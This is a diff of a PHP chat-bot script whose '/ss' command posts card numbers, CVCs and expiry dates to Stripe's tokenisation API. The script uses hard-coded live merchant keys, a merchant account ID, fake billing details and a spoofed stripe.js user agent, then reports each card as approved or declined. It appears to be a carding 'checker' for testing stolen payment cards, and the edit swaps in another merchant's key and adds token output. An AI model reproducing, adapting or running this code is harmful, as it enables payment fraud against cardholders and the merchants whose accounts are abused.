@@ -150,7 +150,7 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
             curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
             curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[address][postal_code]=$zip&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=13th+ave+st&billing_details[email]=jacobmaxon2%40gmail.com&billing_details[name]=jacob+maxon&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=$guid&muid=$muid&sid=$sid&pasted_fields=number&payment_user_agent=stripe.js%2F5121664f0%3B+stripe-js-v3%2F5121664f0&time_on_page=947892&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU");
+            curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&billing_details[name]=klasjfkj+askljf&billing_details[email]=asdlkfjlkJ%40gmail.com&billing_details[address][country]=US&billing_details[address][postal_code]=10080&guid=0c6cdbba-e810-4d66-a89a-9bd836f0c56c83418a&muid=3ab38539-e7a1-4cfd-b79b-3dbdf03fe40cab0b74&sid=27aed0d3-5693-4593-8c25-cc8a7d74320e80b76c&_stripe_account=acct_1FnGBxBVCZ9Tk8l4&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&payment_user_agent=stripe.js%2F5121664f0%3B+stripe-js-v3%2F5121664f0%3B+checkout");
             $result1 = curl_exec($ch);
             
             if(stripos($result1, 'error')){
@@ -388,7 +388,7 @@ Time -» <b>$time</b><b>s</b>
 <b>Status -» Declined! ❌
 Response -» $errormessage | 
 Decline Error -» $errorcode
-Result -» $result2 | RESP3 -$resp3 | HahsVal - $hashval | SessionToken - $sesstok | ConfirmationURL - $confirmurl | ClientSecret - $clientsecret | PaymentIntent - $intent | URL - $stripejs | SourceSRC - $sourcesrc | FinalURL - $final | Resp5 - $resp5
+Result -» $result2 | Token - $id | RESP3 -$resp3 | HahsVal - $hashval | SessionToken - $sesstok | ConfirmationURL - $confirmurl | ClientSecret - $clientsecret | PaymentIntent - $intent | URL - $stripejs | SourceSRC - $sourcesrc | FinalURL - $final | Resp5 - $resp5
 Gateway -» 1💲 STRIPE
 Time -» <b>$time</b><b>s</b>
 
